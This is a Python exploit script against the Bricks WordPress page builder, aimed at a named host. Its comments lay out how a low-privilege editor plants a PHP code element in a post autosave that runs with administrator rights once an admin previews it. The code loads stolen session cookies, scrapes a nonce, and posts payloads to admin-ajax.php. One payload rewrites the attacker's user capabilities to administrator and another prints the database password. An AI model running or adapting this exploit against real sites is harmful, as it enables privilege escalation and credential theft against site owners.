#!/usr/bin/python3

# Entry points
# *) We can inject malicious PHP into create_auto_save
#   - low priv user needs edit_content capability (but not full_access nor execute_code) to put code in DB, later run by admin
#   - can we restore the auto save?
#       - not from WP restore function
#       - bricks restores with help of render_element + save_post (both are pretty safe)
#   - maybe trick an admin to restore or review.
#       - admin will get a notice of the newer version of this post
#       - the same second admin clicks "preview" the malicius code runs as administrator
#
# *) Create post
#   - low priv user can create a post/page through rest api
#       - if plugin is installed that allowes update meta_data from rest api we have RCE.
#       - bricks will just look for what is in DB, when its there it will be executed.
#
# *) Try with templates instead of pages/posts
#

# 1) Editor creates an auto save for the index (GET: /)
#   - the auto save contains a code element with malicious PHP
#   - ie a database query to make the editor escalate from editor to admin
# 2) Administrator opens the page
#   - admin then gets a notice that there are a newer version of this page in database
#   - and an Option to review those changes appear on Admin screen
# 3) Administrator presses review button
#   - evil PHP code will now be run as administrator
#   - Pwned!

import requests, pickle, re
from bs4 import BeautifulSoup

# Attack this host
host="https://vuln-patch.blueteamer.io"

# Attack this post ID
#post_id='72' # 72 is created by admin Emil and contains no code element
post_id='96' # 96 is created by contributor and needs review

# My user id -> will get admin privs
my_user_id='5'

# See "attack_cookies.py" for automatically creating the file _cookies (low priv user cookies)
def load_cookies():
    with open('_cookies', 'rb') as f:
        return pickle.load(f)


def get_nonce(path='', script_id=''):
    if path == '':
        path = '/wp-admin/'
    if script_id == '':
        script_id = 'bricks-admin-js-extra'

    html_data = requests.get(host+path, cookies=load_cookies())
    soup = BeautifulSoup(html_data.text, 'html.parser')
    bricks_js = soup.find(id=script_id)
    nonce = re.search('nonce":"(.*?)",', str(bricks_js))
    return nonce.group(1)

def wp_auto_save():
    nonce=get_nonce() # Try regular admin nonce
    evil_data_code = '[{\"id\":\"fxrpbw\",\"name\":\"section\",\"parent\":0,\"children\":[\"boakjv\"],\"settings\":[]},{\"id\":\"boakjv\",\"name\":\"container\",\"parent\":\"fxrpbw\",\"children\":[\"dvbqrd\",\"imsdev\",\"yghfal\"],\"settings\":{}},{\"id\":\"dvbqrd\",\"name\":\"heading\",\"parent\":\"boakjv\",\"children\":[],\"settings\":{\"text\":\"This page is created with bricks - by admin emil\"}},{\"id\":\"imsdev\",\"name\":\"text\",\"parent\":\"boakjv\",\"children\":[],\"settings\":{\"text\":\"<p>There is no code element hereee! d12</p>\"}},{\"id\":\"yghfal\",\"name\":\"code\",\"parent\":\"boakjv\",\"children\":[],\"settings\":{\"code\":\"<?php echo \\\"DB PW: \\\" . DB_PASSWORD; ?>\",\"executeCode\":true}}]'
    evil_payload='[{\"id\":\"fxrpbw\",\"name\":\"section\",\"parent\":0,\"children\":[\"boakjv\"],\"settings\":{}},{\"id\":\"boakjv\",\"name\":\"container\",\"parent\":\"fxrpbw\",\"children\":[\"dvbqrd\",\"imsdev\",\"yghfal\"],\"settings\":{}},{\"id\":\"dvbqrd\",\"name\":\"heading\",\"parent\":\"boakjv\",\"children\":[],\"settings\":{\"text\":\"This page is created with bricks - by admin emil\"}},{\"id\":\"imsdev\",\"name\":\"text\",\"parent\":\"boakjv\",\"children\":[],\"settings\":{\"text\":\"<p>There is no code element hereee! d12</p>\"}},{\"id\":\"yghfal\",\"name\":\"code\",\"parent\":\"boakjv\",\"children\":[],\"settings\":{\"executeCode\":true,\"code\":\"<?php $my_id=\\\"'+my_user_id+'\\\"; $a=\'a:1:{s:13:\\\"administrator\\\";s:1:\\\"1\\\";}\'; global $wpdb; $wpdb->query(\\\"UPDATE wp_usermeta SET `meta_value`=\'{$a}\' WHERE meta_key=\'wp_capabilities\' AND user_id=\'$my_id\';\\\"); echo \\\"Pwned!\\\"; echo $wpdb->last_error; ?>\"},\"themeStyles\":{}}]'
    data = { 
        "action": "bricks_create_autosave",
        "area": "content",
        "elements": evil_payload,
        "nonce": nonce,
        "postId": post_id,
        "bricks-is-builder": "1"
    }

    return requests.post(host+'/wp-admin/admin-ajax.php', cookies=load_cookies(), data=data)

res = wp_auto_save()
print(res, res.json())
